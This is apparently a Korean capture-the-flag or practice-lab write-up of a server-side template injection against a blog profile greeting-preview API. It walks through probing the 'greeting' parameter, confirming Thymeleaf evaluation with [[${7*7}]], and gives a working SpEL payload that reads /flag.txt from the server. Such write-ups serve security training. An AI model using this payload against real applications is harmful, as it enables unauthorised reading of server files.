==========================
SSTI 1번
==========================

1. 공격 과정
  1) 블로그 프로필 소개 문구의 미리보기 기능을 확인
  2) 미리보기 버튼 클릭 시 다음 요청이 전송되는 것을 확인
     POST /practice01/api/v1/profile/greeting-previews
  3) 요청 본문의 greeting 파라미터에 입력한 소개 문구가 JSON 형식으로 전달되는 것을 확인
     {"greeting":"안녕하세요. 한수쟝의 EQSTory입니다."}
  4) 먼저 {7*7}을 입력했으나 그대로 출력되어 해당 문법은 해석되지 않았음
     {7*7} => {7*7}
  5) Thymeleaf 인라인 표현식 형태로 다시 테스트
     [[${7*7}]] => 49
  6) 계산 결과가 49로 출력되는 것을 통해 사용자의 입력값이 서버 템플릿 엔진에서 해석되는 것을 확인
  7) 이후 Java 파일 처리 클래스를 이용해 서버에 저장된 /flag.txt 파일 획득
     [[${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/flag.txt'))}]]

2. 공격 URL, Parameter
  -공격 URL:https://lab.eqst.co.kr:8445/practice01/api/v1/profile/greeting-previews
  -Parameter:greeting

3. 공격 구문
  [[${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/flag.txt'))}]]
